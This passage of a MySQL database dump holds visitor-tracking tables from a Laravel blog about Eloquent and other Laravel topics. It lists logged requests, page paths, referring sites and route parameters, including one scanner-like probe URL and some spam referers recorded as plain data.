09:55:16',20),(976,764,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-09 13:25:19','2018-01-09 09:55:19',20),(977,765,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 13:57:18','2018-01-09 10:27:18',NULL),(978,766,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 14:20:33','2018-01-09 10:50:33',NULL),(979,767,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-09 14:44:48','2018-01-09 11:14:48',NULL),(980,768,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-09 14:50:48','2018-01-09 11:20:48',NULL),(981,769,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 15:08:32','2018-01-09 11:38:32',NULL),(982,770,20,NULL,'GET',27,0,0,0,0,NULL,'2018-01-09 15:37:20','2018-01-09 12:07:19',NULL),(983,771,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-09 15:46:09','2018-01-09 12:16:09',NULL),(984,772,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-09 15:46:12','2018-01-09 12:16:12',NULL),(985,773,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-09 15:46:15','2018-01-09 12:16:15',NULL),(986,774,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-09 15:46:18','2018-01-09 12:16:18',NULL),(987,775,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-09 15:46:22','2018-01-09 12:16:22',NULL),(988,776,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-09 16:47:42','2018-01-09 13:17:42',NULL),(989,777,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-09 17:01:59','2018-01-09 13:31:59',NULL),(990,778,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-09 17:03:22','2018-01-09 13:33:22',NULL),(991,779,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-09 17:03:25','2018-01-09 13:33:25',NULL),(992,780,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-09 17:56:07','2018-01-09 14:26:07',NULL),(993,781,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-09 17:56:12','2018-01-09 14:26:12',NULL),(994,782,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-09 17:56:20','2018-01-09 14:26:20',NULL),(995,783,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-09 18:08:29','2018-01-09 14:38:29',20),(996,783,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-09 18:08:32','2018-01-09 14:38:32',20),(997,784,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-09 18:24:38','2018-01-09 14:54:38',NULL),(998,785,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-09 18:29:33','2018-01-09 14:59:33',NULL),(999,786,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 18:40:53','2018-01-09 15:10:53',NULL),(1000,787,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 18:53:39','2018-01-09 15:23:39',NULL),(1001,788,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-09 19:02:34','2018-01-09 15:32:34',NULL);
/*!40000 ALTER TABLE `tracker_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_paths`
--

DROP TABLE IF EXISTS `tracker_paths`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_paths` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `path` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_paths_path_index` (`path`),
  KEY `tracker_paths_created_at_index` (`created_at`),
  KEY `tracker_paths_updated_at_index` (`updated_at`)
) ENGINE=InnoDB AUTO_INCREMENT=29 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_paths`
--

LOCK TABLES `tracker_paths` WRITE;
/*!40000 ALTER TABLE `tracker_paths` DISABLE KEYS */;
INSERT INTO `tracker_paths` VALUES (1,'blogs/14-migration-%DA%86%D8%B7%D9%88%D8%B1-%DB%8C%DA%A9-%DA%A9%D9%84%DB%8C%D8%AF-%D8%AE%D8%A7%D8%B1%D8%AC%DB%8C-%D8%B1%D8%A7-drop-%DA%A9%D9%86%DB%8C%D9%85','2017-12-26 10:50:42','2017-12-26 10:50:42'),(2,'/','2017-12-26 12:07:43','2017-12-26 12:07:43'),(3,'test','2017-12-26 12:19:46','2017-12-26 12:19:46'),(4,'laravel-filemanager','2017-12-26 12:36:11','2017-12-26 12:36:11'),(5,'laravel-filemanager/folders','2017-12-26 12:36:18','2017-12-26 12:36:18'),(6,'laravel-filemanager/errors','2017-12-26 12:36:19','2017-12-26 12:36:19'),(7,'laravel-filemanager/jsonitems','2017-12-26 12:36:20','2017-12-26 12:36:20'),(8,'laravel-filemanager/newfolder','2017-12-26 12:41:25','2017-12-26 12:41:25'),(9,'laravel-filemanager/upload','2017-12-26 12:48:23','2017-12-26 12:48:23'),(10,'blogs/like/14','2017-12-26 10:06:13','2017-12-26 10:06:13'),(11,'logout','2017-12-26 10:18:52','2017-12-26 10:18:52'),(12,'blogs/3-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84-%D8%AF%D9%88-%D8%B1%D8%A7%D9%87-%D8%A8%D8%B1%D8%A7%DB%8C-%D8%AF%D8%B1%D8%AC-%D8%AF%DB%8C%D8%AA%D8%A7%DB%8C-%D9%BE%DB%8C%D8%B4-%D9%81%D8%B1%D8%B6','2017-12-26 10:28:07','2017-12-26 10:28:07'),(13,'blogs/4-eloquent-when-%D8%A8%D8%B1%D8%A7%DB%8C-%DA%A9%D9%88%D8%A6%D8%B1%DB%8C-%D9%87%D8%A7%DB%8C-%D9%85%D8%B4%D8%B1%D9%88%D8%B7','2017-12-26 10:28:11','2017-12-26 10:28:11'),(14,'blogs/5-%DB%B1%DB%B0-%D8%AA%D8%A7%D8%A8%D8%B9-%DA%A9%D9%85%D8%AA%D8%B1-%D8%B4%D9%86%D8%A7%D8%AE%D8%AA%D9%87-%D8%B4%D8%AF%D9%87-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','2017-12-26 10:28:14','2017-12-26 10:28:14'),(15,'blogs/6-eloquent-orm-%D9%88-query-builder-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','2017-12-26 10:28:21','2017-12-26 10:28:21'),(16,'blogs','2017-12-26 13:57:21','2017-12-26 13:57:21'),(17,'blogs/10-accessors-%D9%88-mutators-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','2017-12-26 17:21:18','2017-12-26 17:21:18'),(18,'blogs/9-simplepanigate-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84-%D9%85%D9%81%DB%8C%D8%AF%D8%AA%D8%B1-%D8%A8%D8%B1%D8%A7%DB%8C-%D8%AF%DB%8C%D8%AA%D8%A7%D9%87%D8%A7%DB%8C-%D8%A8%D8%B2%D8%B1%DA%AF','2017-12-26 17:21:30','2017-12-26 17:21:30'),(19,'blogs/1-abstract-classes-interfaces','2017-12-26 20:07:13','2017-12-26 20:07:13'),(20,'blogs/7-belongsto-default-models-no-need-to-check-in','2017-12-26 20:07:48','2017-12-26 20:07:48'),(21,'blogs/12-%D8%AA%D9%88%D8%A7%D8%A8%D8%B9-has-%D9%88-doesnthave-%D8%AF%D8%B1-eloquent','2017-12-26 20:08:12','2017-12-26 20:08:12'),(22,'blogs/11-eloquent-%DA%86%DA%AF%D9%88%D9%86%D9%87-%D9%86%D8%AA%D8%A7%DB%8C%D8%AC-%D8%B1%D8%A7-%D8%A8%D8%A7-mutator-attribute-%D9%85%D8%B1%D8%AA%D8%A8-%DA%A9%D9%86%DB%8C%D9%85','2017-12-27 03:07:53','2017-12-27 03:07:53'),(23,'blogs/13-eloquent-%DA%AF%D8%B1%D9%81%D8%AA%D9%86-%D8%A2%D8%AE%D8%B1%DB%8C%D9%86-row-%D8%AF%D8%B1-%DB%8C%DA%A9-relation','2017-12-27 07:59:42','2017-12-27 07:59:42'),(24,'blogs/2-%D8%AA%D9%82%D8%B3%DB%8C%D9%85-%D9%86%D8%AA%D8%A7%DB%8C%D8%AC-%D8%AF%D8%B1-blade-%D8%A8%D8%A7-%D8%A7%D8%B3%D8%AA%D9%81%D8%A7%D8%AF%D9%87-%D8%A7%D8%B2-chunks','2017-12-27 08:00:02','2017-12-27 08:00:02'),(25,'login','2017-12-27 08:57:35','2017-12-27 08:57:35'),(26,'blogs/like/12','2017-12-30 08:32:21','2017-12-30 08:32:21'),(27,'comments/13/blog','2017-12-30 09:45:22','2017-12-30 09:45:22'),(28,'blogs/2-onvan','2018-01-07 06:27:03','2018-01-07 06:27:03');
/*!40000 ALTER TABLE `tracker_paths` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_queries`
--

DROP TABLE IF EXISTS `tracker_queries`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_queries` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `query` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_queries_query_index` (`query`),
  KEY `tracker_queries_created_at_index` (`created_at`),
  KEY `tracker_queries_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_queries`
--

LOCK TABLES `tracker_queries` WRITE;
/*!40000 ALTER TABLE `tracker_queries` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_queries` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_query_arguments`
--

DROP TABLE IF EXISTS `tracker_query_arguments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_query_arguments` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `query_id` bigint(20) unsigned NOT NULL,
  `argument` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `value` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_query_arguments_query_id_index` (`query_id`),
  KEY `tracker_query_arguments_argument_index` (`argument`),
  KEY `tracker_query_arguments_value_index` (`value`),
  KEY `tracker_query_arguments_created_at_index` (`created_at`),
  KEY `tracker_query_arguments_updated_at_index` (`updated_at`),
  CONSTRAINT `tracker_query_arguments_query_id_foreign` FOREIGN KEY (`query_id`) REFERENCES `tracker_queries` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_query_arguments`
--

LOCK TABLES `tracker_query_arguments` WRITE;
/*!40000 ALTER TABLE `tracker_query_arguments` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_query_arguments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_referers`
--

DROP TABLE IF EXISTS `tracker_referers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_referers` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `domain_id` bigint(20) unsigned NOT NULL,
  `url` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `host` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `medium` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `source` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `search_terms_hash` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `tracker_referers_domain_id_index` (`domain_id`),
  KEY `tracker_referers_url_index` (`url`),
  KEY `tracker_referers_created_at_index` (`created_at`),
  KEY `tracker_referers_updated_at_index` (`updated_at`),
  KEY `tracker_referers_medium_index` (`medium`),
  KEY `tracker_referers_source_index` (`source`),
  KEY `tracker_referers_search_terms_hash_index` (`search_terms_hash`),
  CONSTRAINT `tracker_referers_domain_id_foreign` FOREIGN KEY (`domain_id`) REFERENCES `tracker_domains` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=55 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_referers`
--

LOCK TABLES `tracker_referers` WRITE;
/*!40000 ALTER TABLE `tracker_referers` DISABLE KEYS */;
INSERT INTO `tracker_referers` VALUES (1,1,'http://test.app/admin/blogs','test.app','2017-12-26 10:50:42','2017-12-26 10:50:42',NULL,NULL,NULL),(2,1,'http://test.app/blogs/14-migration-%DA%86%D8%B7%D9%88%D8%B1-%DB%8C%DA%A9-%DA%A9%D9%84%DB%8C%D8%AF-%D8%AE%D8%A7%D8%B1%D8%AC%DB%8C-%D8%B1%D8%A7-drop-%DA%A9%D9%86%DB%8C%D9%85','test.app','2017-12-26 12:07:43','2017-12-26 12:07:43',NULL,NULL,NULL),(3,1,'http://test.app/laravel-filemanager','test.app','2017-12-26 12:36:18','2017-12-26 12:36:18',NULL,NULL,NULL),(4,1,'http://test.app/admin/blogs/14/edit','test.app','2017-12-26 12:38:20','2017-12-26 12:38:20',NULL,NULL,NULL),(5,1,'http://test.app/laravel-filemanager?type=image','test.app','2017-12-26 12:38:26','2017-12-26 12:38:26',NULL,NULL,NULL),(6,1,'http://test.app/laravel-filemanager/?type=image','test.app','2017-12-26 12:46:38','2017-12-26 12:46:38',NULL,NULL,NULL),(7,2,'http://saeednasiri.com/admin/blogs','saeednasiri.com','2017-12-26 10:06:00','2017-12-26 10:06:00',NULL,NULL,NULL),(8,2,'http://saeednasiri.com/blogs/14-migration-%DA%86%D8%B7%D9%88%D8%B1-%DB%8C%DA%A9-%DA%A9%D9%84%DB%8C%D8%AF-%D8%AE%D8%A7%D8%B1%D8%AC%DB%8C-%D8%B1%D8%A7-drop-%DA%A9%D9%86%DB%8C%D9%85','saeednasiri.com','2017-12-26 10:06:12','2017-12-26 10:06:12',NULL,NULL,NULL),(9,2,'http://saeednasiri.com/admin/blogs/14/edit','saeednasiri.com','2017-12-26 10:06:36','2017-12-26 10:06:36',NULL,NULL,NULL),(10,2,'http://saeednasiri.com/laravel-filemanager?type=image','saeednasiri.com','2017-12-26 10:06:38','2017-12-26 10:06:38',NULL,NULL,NULL),(11,2,'http://saeednasiri.com/','saeednasiri.com','2017-12-27 02:03:25','2017-12-27 02:03:25',NULL,NULL,NULL),(12,2,'http://www.saeednasiri.com/','www.saeednasiri.com','2017-12-27 02:03:31','2017-12-27 02:03:31',NULL,NULL,NULL),(13,2,'http://saeednasiri.com','saeednasiri.com','2017-12-27 03:06:46','2017-12-27 03:06:46',NULL,NULL,NULL),(14,3,'https://www.google.com/','www.google.com','2017-12-27 03:45:16','2017-12-27 03:45:16','search','Google','da39a3ee5e6b4b0d3255bfef95601890afd80709'),(15,4,'http://www.zeema.org/projects/','www.zeema.org','2017-12-27 05:07:58','2017-12-27 05:07:58',NULL,NULL,NULL),(16,5,'http://www.alirezaghorbani.com/','www.alirezaghorbani.com','2017-12-27 07:52:35','2017-12-27 07:52:35',NULL,NULL,NULL),(17,2,'http://www.saeednasiri.com','www.saeednasiri.com','2017-12-27 07:54:14','2017-12-27 07:54:14',NULL,NULL,NULL),(18,2,'http://www.saeednasiri.com/blogs/11-eloquent-%DA%86%DA%AF%D9%88%D9%86%D9%87-%D9%86%D8%AA%D8%A7%DB%8C%D8%AC-%D8%B1%D8%A7-%D8%A8%D8%A7-mutator-attribute-%D9%85%D8%B1%D8%AA%D8%A8-%DA%A9%D9%86%DB%8C%D9%85','www.saeednasiri.com','2017-12-27 07:59:39','2017-12-27 07:59:39',NULL,NULL,NULL),(19,2,'http://www.saeednasiri.com/blogs','www.saeednasiri.com','2017-12-27 07:59:54','2017-12-27 07:59:54',NULL,NULL,NULL),(20,2,'http://saeednasiri.com/login','saeednasiri.com','2017-12-27 08:57:40','2017-12-27 08:57:40',NULL,NULL,NULL),(21,2,'http://saeednasiri.com/admin','saeednasiri.com','2017-12-27 08:57:47','2017-12-27 08:57:47',NULL,NULL,NULL),(22,6,'https://www.google.co.uk/','www.google.co.uk','2017-12-29 15:30:11','2017-12-29 15:30:11','search','Google','da39a3ee5e6b4b0d3255bfef95601890afd80709'),(23,7,'http://uptime-as.net/saeednasiri.com','uptime-as.net','2017-12-29 17:25:07','2017-12-29 17:25:07',NULL,NULL,NULL),(24,8,'http://uptime-us.net/saeednasiri.com','uptime-us.net','2017-12-30 02:13:14','2017-12-30 02:13:14',NULL,NULL,NULL),(25,2,'http://saeednasiri.com/blogs','saeednasiri.com','2017-12-30 08:31:57','2017-12-30 08:31:57',NULL,NULL,NULL),(26,2,'http://saeednasiri.com/blogs/12-%D8%AA%D9%88%D8%A7%D8%A8%D8%B9-has-%D9%88-doesnthave-%D8%AF%D8%B1-eloquent','saeednasiri.com','2017-12-30 08:32:21','2017-12-30 08:32:21',NULL,NULL,NULL),(27,2,'http://saeednasiri.com/blogs/13-eloquent-%DA%AF%D8%B1%D9%81%D8%AA%D9%86-%D8%A2%D8%AE%D8%B1%DB%8C%D9%86-row-%D8%AF%D8%B1-%DB%8C%DA%A9-relation','saeednasiri.com','2017-12-30 09:45:22','2017-12-30 09:45:22',NULL,NULL,NULL),(28,9,'http://uptime-eu.net/saeednasiri.com','uptime-eu.net','2017-12-31 01:59:03','2017-12-31 01:59:03',NULL,NULL,NULL),(29,2,'http://saeednasiri.com/blogs/11-eloquent-%DA%86%DA%AF%D9%88%D9%86%D9%87-%D9%86%D8%AA%D8%A7%DB%8C%D8%AC-%D8%B1%D8%A7-%D8%A8%D8%A7-mutator-attribute-%D9%85%D8%B1%D8%AA%D8%A8-%DA%A9%D9%86%DB%8C%D9%85','saeednasiri.com','2018-01-02 23:05:34','2018-01-02 23:05:34',NULL,NULL,NULL),(30,2,'http://saeednasiri.com/blogs/10-accessors-%D9%88-mutators-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','saeednasiri.com','2018-01-02 23:05:48','2018-01-02 23:05:48',NULL,NULL,NULL),(31,2,'http://saeednasiri.com/blogs/1-abstract-classes-interfaces','saeednasiri.com','2018-01-02 23:05:51','2018-01-02 23:05:51',NULL,NULL,NULL),(32,2,'http://saeednasiri.com/blogs?categoryId=1','saeednasiri.com','2018-01-02 23:05:53','2018-01-02 23:05:53',NULL,NULL,NULL),(33,2,'http://saeednasiri.com/blogs?categoryId=2','saeednasiri.com','2018-01-02 23:05:56','2018-01-02 23:05:56',NULL,NULL,NULL),(34,2,'http://saeednasiri.com/blogs?tag=eloquent','saeednasiri.com','2018-01-02 23:05:58','2018-01-02 23:05:58',NULL,NULL,NULL),(35,2,'http://www.saeednasiri.com/blogs/6-eloquent-orm-%D9%88-query-builder-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','www.saeednasiri.com','2018-01-05 07:01:57','2018-01-05 07:01:57',NULL,NULL,NULL),(36,10,'http://analvids.buron.pw/','analvids.buron.pw','2018-01-05 09:36:40','2018-01-05 09:36:40',NULL,NULL,NULL),(37,2,'http://saeednasiri.com/admin/profile','saeednasiri.com','2018-01-05 12:18:26','2018-01-05 12:18:26',NULL,NULL,NULL),(38,2,'http://www.saeednasiri.com/public/images/','www.saeednasiri.com','2018-01-05 19:58:41','2018-01-05 19:58:41',NULL,NULL,NULL),(39,2,'http://www.saeednasiri.com/public/','www.saeednasiri.com','2018-01-05 19:58:46','2018-01-05 19:58:46',NULL,NULL,NULL),(40,2,'http://www.saeednasiri.com/blogs/1-abstract-classes-interfaces','www.saeednasiri.com','2018-01-05 20:06:37','2018-01-05 20:06:37',NULL,NULL,NULL),(41,2,'http://www.saeednasiri.com/public/blogs/1-abstract-classes-interfaces','www.saeednasiri.com','2018-01-05 20:07:11','2018-01-05 20:07:11',NULL,NULL,NULL),(42,2,'http://www.saeednasiri.com/blogs/7-belongsto-default-models-no-need-to-check-in','www.saeednasiri.com','2018-01-05 20:07:21','2018-01-05 20:07:21',NULL,NULL,NULL),(43,2,'http://www.saeednasiri.com/public/blogs','www.saeednasiri.com','2018-01-05 20:07:46','2018-01-05 20:07:46',NULL,NULL,NULL),(44,2,'http://www.saeednasiri.com/public/blogs/7-belongsto-default-models-no-need-to-check-in','www.saeednasiri.com','2018-01-05 20:07:52','2018-01-05 20:07:52',NULL,NULL,NULL),(45,2,'http://www.saeednasiri.com/blogs/12-%D8%AA%D9%88%D8%A7%D8%A8%D8%B9-has-%D9%88-doesnthave-%D8%AF%D8%B1-eloquent','www.saeednasiri.com','2018-01-05 20:08:21','2018-01-05 20:08:21',NULL,NULL,NULL),(46,2,'http://www.saeednasiri.com/public/blogs/12-%D8%AA%D9%88%D8%A7%D8%A8%D8%B9-has-%D9%88-doesnthave-%D8%AF%D8%B1-eloquent','www.saeednasiri.com','2018-01-05 20:08:46','2018-01-05 20:08:46',NULL,NULL,NULL),(47,11,'http://whois.domaintools.com/saeednasiri.com','whois.domaintools.com','2018-01-06 01:29:37','2018-01-06 01:29:37',NULL,NULL,NULL),(48,2,'http://www.saeednasiri.com/blogs/5-%DB%B1%DB%B0-%D8%AA%D8%A7%D8%A8%D8%B9-%DA%A9%D9%85%D8%AA%D8%B1-%D8%B4%D9%86%D8%A7%D8%AE%D8%AA%D9%87-%D8%B4%D8%AF%D9%87-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','www.saeednasiri.com','2018-01-06 03:16:38','2018-01-06 03:16:38',NULL,NULL,NULL),(49,12,'http://thewaysband.com/index.php','thewaysband.com','2018-01-06 08:58:45','2018-01-06 08:58:45',NULL,NULL,NULL),(50,2,'http://www.saeednasiri.com/index.php?option=com_fabrik&c=import&view=import&fietype=csv&tableid=0&Itemid=0','www.saeednasiri.com','2018-01-06 11:26:09','2018-01-06 11:26:09',NULL,NULL,NULL),(51,2,'http://saeednasiri.com/admin/blogs?page=1','saeednasiri.com','2018-01-07 01:14:40','2018-01-07 01:14:40',NULL,NULL,NULL),(52,2,'http://saeednasiri.com/admin/comments/3/edit','saeednasiri.com','2018-01-07 01:15:11','2018-01-07 01:15:11',NULL,NULL,NULL),(53,13,'http://www.nbp.pw/results/paid+video','www.nbp.pw','2018-01-07 15:01:19','2018-01-07 15:01:19',NULL,NULL,NULL),(54,3,'https://google.com/','google.com','2018-01-07 21:14:43','2018-01-07 21:14:43','search','Google','da39a3ee5e6b4b0d3255bfef95601890afd80709');
/*!40000 ALTER TABLE `tracker_referers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_referers_search_terms`
--

DROP TABLE IF EXISTS `tracker_referers_search_terms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_referers_search_terms` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `referer_id` bigint(20) unsigned NOT NULL,
  `search_term` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_referers_search_terms_referer_id_index` (`referer_id`),
  KEY `tracker_referers_search_terms_search_term_index` (`search_term`),
  KEY `tracker_referers_search_terms_created_at_index` (`created_at`),
  KEY `tracker_referers_search_terms_updated_at_index` (`updated_at`),
  CONSTRAINT `tracker_referers_referer_id_fk` FOREIGN KEY (`referer_id`) REFERENCES `tracker_referers` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_referers_search_terms`
--

LOCK TABLES `tracker_referers_search_terms` WRITE;
/*!40000 ALTER TABLE `tracker_referers_search_terms` DISABLE KEYS */;
INSERT INTO `tracker_referers_search_terms` VALUES (1,14,'','2017-12-27 03:45:16','2017-12-27 03:45:16'),(2,22,'','2017-12-29 15:30:11','2017-12-29 15:30:11'),(3,54,'','2018-01-07 21:14:43','2018-01-07 21:14:43');
/*!40000 ALTER TABLE `tracker_referers_search_terms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_route_path_parameters`
--

DROP TABLE IF EXISTS `tracker_route_path_parameters`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_route_path_parameters` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `route_path_id` bigint(20) unsigned NOT NULL,
  `parameter` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `value` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_route_path_parameters_route_path_id_index` (`route_path_id`),
  KEY `tracker_route_path_parameters_parameter_index` (`parameter`),
  KEY `tracker_route_path_parameters_value_index` (`value`),
  KEY `tracker_route_path_parameters_created_at_index` (`created_at`),
  KEY `tracker_route_path_parameters_updated_at_index` (`updated_at`),
  CONSTRAINT `tracker_route_path_parameters_route_path_id_foreign` FOREIGN KEY (`route_path_id`) REFERENCES `tracker_route_paths` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=40 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_route_path_parameters`
--

LOCK TABLES `tracker_route_path_parameters` WRITE;
/*!40000 ALTER TABLE `tracker_route_path_parameters` DISABLE KEYS */;
INSERT INTO `tracker_route_path_parameters` VALUES (1,13,'blog','14','2017-12-26 12:36:30','2017-12-26 12:36:30'),(2,16,'blog','14','2017-12-26 13:09:45','2017-12-26 13:09:45'),(3,17,'id','14','2017-12-26 10:06:12','2017-12-26 10:06:12'),(4,19,'id','3','2017-12-26 10:28:07','2017-12-26 10:28:07'),(5,19,'slug','لاراول-دو-راه-برای-درج-دیتای-پیش-فرض','2017-12-26 10:28:07','2017-12-26 10:28:07'),(6,20,'id','4','2017-12-26 10:28:11','2017-12-26 10:28:11'),(7,20,'slug','eloquent-when-برای-کوئری-های-مشروط','2017-12-26 10:28:11','2017-12-26 10:28:11'),(8,21,'id','5','2017-12-26 10:28:14','2017-12-26 10:28:14'),(9,21,'slug','۱۰-تابع-کمتر-شناخته-شده-در-لاراول','2017-12-26 10:28:14','2017-12-26 10:28:14'),(10,22,'id','6','2017-12-26 10:28:21','2017-12-26 10:28:21'),(11,22,'slug','eloquent-orm-و-query-builder-در-لاراول','2017-12-26 10:28:21','2017-12-26 10:28:21'),(12,24,'id','10','2017-12-26 17:21:18','2017-12-26 17:21:18'),(13,24,'slug','accessors-و-mutators-در-لاراول','2017-12-26 17:21:18','2017-12-26 17:21:18'),(14,25,'id','9','2017-12-26 17:21:30','2017-12-26 17:21:30'),(15,25,'slug','simplepanigate-لاراول-مفیدتر-برای-دیتاهای-بزرگ','2017-12-26 17:21:30','2017-12-26 17:21:30'),(16,26,'id','1','2017-12-26 20:07:13','2017-12-26 20:07:13'),(17,26,'slug','abstract-classes-interfaces','2017-12-26 20:07:13','2017-12-26 20:07:13'),(18,27,'id','7','2017-12-26 20:07:48','2017-12-26 20:07:48'),(19,27,'slug','belongsto-default-models-no-need-to-check-in','2017-12-26 20:07:48','2017-12-26 20:07:48'),(20,28,'id','12','2017-12-26 20:08:12','2017-12-26 20:08:12'),(21,28,'slug','توابع-has-و-doesnthave-در-eloquent','2017-12-26 20:08:12','2017-12-26 20:08:12'),(22,29,'id','11','2017-12-27 03:07:53','2017-12-27 03:07:53'),(23,29,'slug','eloquent-چگونه-نتایج-را-با-mutator-attribute-مرتب-کنیم','2017-12-27 03:07:53','2017-12-27 03:07:53'),(24,30,'id','13','2017-12-27 07:59:42','2017-12-27 07:59:42'),(25,30,'slug','eloquent-گرفتن-آخرین-row-در-یک-relation','2017-12-27 07:59:42','2017-12-27 07:59:42'),(26,31,'id','2','2017-12-27 08:00:01','2017-12-27 